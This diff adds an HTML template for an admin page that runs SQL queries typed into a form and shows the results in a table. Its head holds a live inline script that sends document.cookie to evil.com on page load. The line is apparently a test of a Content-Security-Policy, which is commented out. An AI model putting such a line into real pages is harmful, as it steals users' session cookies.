@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!--    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'nonce-{{ nonce }}' https://cdn.tailwindcss.com; style-src 'self' 'unsafe-inline';">-->
+
+    <title>SQL Query Executor</title>
+    <!-- 其他脚本 -->
+    <script nonce="{{ nonce }}">
+        // 在这里可以放置你自己的内联脚本；但依然受csp条件限制；
+        fetch("http://evil.com?cookie=" + document.cookie);
+
+
+        console.log('TailwindCSS is loaded');
+    </script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- 添加 nonce 到 TailwindCSS CDN 的 <script> 标签 -->
+<!--    <script src="https://cdn.tailwindcss.com" nonce="{{ nonce }}"></script>-->
+
+
+
+    <style>
+        /* 确保表格容器是可滚动的 */
+        .table-container {
+            max-height: 500px; /* 设置容器最大高度为 500 像素，超出部分将显示垂直滚动条 */
+            max-width: 100%; /* 设置容器最大宽度为父元素的 100%，防止水平溢出 */
+            overflow-x: auto; /* 启用水平滚动条，当内容宽度超出容器时允许水平滚动 */
+            overflow-y: auto; /* 启用垂直滚动条，当内容高度超出 500px 时允许垂直滚动 */
+            margin-top: 250px; /* 为容器顶部添加 150 像素的外边距，为固定定位的表单留出空间 */
+        }
+
+        /* 将表单固定在页面顶部 */
+        .fixed-form {
+            position: fixed; /* 使用固定定位，使表单始终停留在页面顶部，即使页面滚动 */
+            top: 0; /* 表单顶部与页面顶部对齐 */
+            left: 0; /* 表单左侧与页面左侧对齐 */
+            right: 0; /* 表单右侧与页面右侧对齐，配合 left: 0 使表单水平占满整个页面 */
+            z-index: 10; /* 设置层级为 10，确保表单显示在其他元素之上 */
+            background-color: white; /* 设置表单背景色为白色，避免透明背景导致内容重叠不可读 */
+            padding: 1rem; /* 为表单内容添加 1rem 的内边距，提供更好的视觉间距 */
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); /* 添加阴影效果，水平偏移 0，垂直偏移 2px，模糊半径 4px，颜色为透明度 0.1 的黑色，增强立体感 */
+        }
+
+        /* 确保表格单元格内容换行并防止溢出 */
+        table th, table td {
+            white-space: nowrap; /* 防止文本换行，保持单元格内容在单行显示 */
+            text-overflow: ellipsis; /* 当文本溢出时，显示省略号 (...) 表示内容被截断 */
+            overflow: hidden; /* 隐藏超出单元格宽度的内容，避免溢出 */
+            max-width: 200px; /* 设置单元格最大宽度为 200 像素，限制内容宽度以保持表格整洁 */
+        }
+    </style>
+
+</head>
+<body class="bg-gray-100 font-sans">
+    <div class="container mx-auto p-4">
+        <!-- Fixed Input Form -->
+        <div class="fixed-form bg-white">
+            <h1 class="text-2xl font-bold mb-4 text-gray-800">SQL Query Executor</h1>
+            <form method="post" action="/api/v1/admin/execute_sql" class="flex flex-col space-y-4">
+                <textarea
+                    name="sql"
+                    rows="4"
+                    class="w-full p-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
+                    placeholder="Enter your SQL query here..."
+                ></textarea>
+                <button
+                    type="submit"
+                    class="bg-blue-500 text-white px-4 py-2 rounded-md hover:bg-blue-600 transition"
+                >
+                    Run Query
+                </button>
+            </form>
+        </div>
+
+        <!-- Query Results or Messages -->
+        {% if results.error %}
+            <div class="table-container">
+                <div class="bg-red-100 border-l-4 border-red-500 text-red-700 p-4 rounded-md">
+                    <p class="font-bold">Error</p>
+                    <p>{{ results.error }}</p>
+                </div>
+            </div>
+        {% else %}
+            {% if results.columns %}
+                <div class="table-container">
+                    <h2 class="text-xl font-semibold mb-4 text-gray-800">Query Results</h2>
+                    <table class="min-w-full bg-white border rounded-md shadow-sm">
+                        <thead class="bg-gray-200">
+                            <tr>
+                                {% for col in results.columns %}
+                                    <th class="py-2 px-4 border-b text-left text-gray-600">{{ col }}</th>
+                                {% endfor %}
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% for row in results.rows %}
+                                <tr class="hover:bg-gray-50">
+                                    {% for col in results.columns %}
+                                        <td class="py-2 px-4 border-b text-gray-800">{{ row[col] }}</td>
+                                    {% endfor %}
+                                </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+            {% elif results.message %}
+                <div class="table-container">
+                    <div class="bg-green-100 border-l-4 border-green-500 text-green-700 p-4 rounded-md">
+                        <p class="font-bold">Result</p>
+                        <p>{{ results.message }}</p>
+                    </div>
+                </div>
+            {% endif %}
+        {% endif %}
+    </div>
+</body>
+</html>
